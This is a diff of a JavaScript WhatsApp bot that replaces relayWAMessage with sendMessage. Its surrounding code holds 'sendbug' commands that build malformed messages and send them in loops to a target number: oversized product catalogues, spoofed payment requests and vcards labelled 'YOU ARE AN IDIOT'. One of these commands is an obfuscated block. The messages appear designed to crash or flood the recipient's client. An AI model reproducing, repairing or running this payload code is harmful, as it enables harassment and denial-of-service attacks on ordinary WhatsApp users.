@@ -1,5 +1,5 @@
 ﻿require('./settings')
-const { BufferJSON, relayWAMessage, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
+const { BufferJSON, sendMessage, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
 const fs = require('fs')
 const util = require('util')
 const chalk = require('chalk')
@@ -54,7 +54,7 @@ const { frkey } = JSON.parse(fs.readFileSync('./frkey.js'))
 const { hentai } = require('./lib/scraper2.js')
 virgam = fs.readFileSync(`./virus/image/deden.jpeg`)
 const deploy = (teks) => {
-  XeonBotInc.relayWAMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
+  XeonBotInc.sendMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 const {
  FajarNews, 
  BBCNews,
@@ -5756,7 +5756,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1658703206",
 }
 }), { userJid: m.chat })
-XeonBotInc.relayWAMessage(m.chat, document.message, { messageId: document.key.id })
+XeonBotInc.sendMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
@@ -5780,7 +5780,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1659416157",
 }
 }), { userJid: m.chat })
-XeonBotInc.relayWAMessage(m.chat, document.message, { messageId: document.key.id })
+XeonBotInc.sendMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
@@ -5799,7 +5799,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+XeonBotInc.sendMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
 }
 }
 break
@@ -5926,7 +5926,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, location.message, { messageId: location.key.id })
+XeonBotInc.sendMessage(m.chat, location.message, { messageId: location.key.id })
 }
 }
 break
@@ -5946,7 +5946,7 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
+XeonBotInc.sendMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
 }
 }
 break
@@ -6003,7 +6003,7 @@ var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1657190832",
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, audio.message, { messageId: audio.key.id })
+XeonBotInc.sendMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 }
 break
@@ -6030,7 +6030,7 @@ var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, image.message, { messageId: image.key.id })
+XeonBotInc.sendMessage(m.chat, image.message, { messageId: image.key.id })
 }
 }
 break
@@ -6055,7 +6055,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1657288637",
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, document.message, { messageId: document.key.id })
+XeonBotInc.sendMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
@@ -6075,7 +6075,7 @@ var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "previewType": "NONE",
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, extended.message, { messageId: extended.key.id })
+XeonBotInc.sendMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 }
 break
@@ -6098,7 +6098,7 @@ var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "isAnimated": false,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+XeonBotInc.sendMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
@@ -6119,7 +6119,7 @@ var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, extended.message, { messageId: extended.key.id })
+XeonBotInc.sendMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 }
 break
@@ -6135,7 +6135,7 @@ var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:YOU ARE AN IDIOT\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:YOU ARE AN IDIOT\nX-WA-BIZ-NAME:YOU ARE AN IDIOT\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, contact.message, { messageId: contact.key.id })
+XeonBotInc.sendMessage(m.chat, contact.message, { messageId: contact.key.id })
 }
 }
 break
@@ -6181,7 +6181,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "selectableOptionsCount": 5
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+XeonBotInc.sendMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 deploy('sukses sendbug')}
 }
 break
@@ -6192,7 +6192,7 @@ if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nConto
 jumlah = `${encodeURI(q)}`
 ydd = `YOU ARE AN IDIOT`
 for (let i = 0; i < jumlah; i++) {
-function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':XeonBotInc[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':thumb,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});XeonBotInc['relayWAMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':XeonBotInc[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':thumb,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});XeonBotInc['sendMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
 }
 }
 break
@@ -6219,7 +6219,7 @@ var order1 = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "totalCurrencyCode": "IDR",
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, order.message, { messageId: order.key.id })
+XeonBotInc.sendMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
@@ -6242,7 +6242,7 @@ var order2 = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
-XeonBotInc.relayWAMessage(m.chat, order.message, { messageId: order.key.id })
+XeonBotInc.sendMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
@@ -6271,7 +6271,7 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 	}, contextInfo:{}}) 
-	XeonBotInc.relayWAMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
+	XeonBotInc.sendMessage(m.chat, troli2.message, { messageId: troli2.key.id, a})
 	}
 	}
 	break
@@ -6290,7 +6290,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "text": `YOU ARE AN IDIOT`,
 }
 }}), { userJid: m.chat, quoted: doc})
-XeonBotInc.relayWAMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+XeonBotInc.sendMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
@@ -6311,7 +6311,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "text": `YOU ARE AN IDIOT`,
 }
 }}), { userJid: m.chat, quoted: doc})
-XeonBotInc.relayWAMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+XeonBotInc.sendMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
@@ -6339,7 +6339,7 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc})
-XeonBotInc.relayWAMessage(num, catalog.message, { messageId: catalog.key.id })
+XeonBotInc.sendMessage(num, catalog.message, { messageId: catalog.key.id })
 }
 tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
 m.reply(tekteka)
@@ -6351,7 +6351,7 @@ if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nConto
 jumlah = `${encodeURI(q)}`
 ydd = `YOU ARE AN IDIOT`
 for (let i = 0; i < jumlah; i++) {
-XeonBotInc.relayWAMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `YOU ARE AN IDIOT`,"body": `IDIOT`,
+XeonBotInc.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `YOU ARE AN IDIOT`,"body": `IDIOT`,
 mimetype: 'audio/mpeg', caption: `${buttonkal}`,
 showAdAttribution: true,
 sourceUrl: `https://telegra.ph/file/0933284b7edf2a374a830.jpg`,
@@ -10874,7 +10874,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
           listType: 1
                 }
             }), {})
-            XeonBotInc.relayWAMessage(m.chat, template.message, { messageId: template.key.id })
+            XeonBotInc.sendMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
 case 'allmenu':
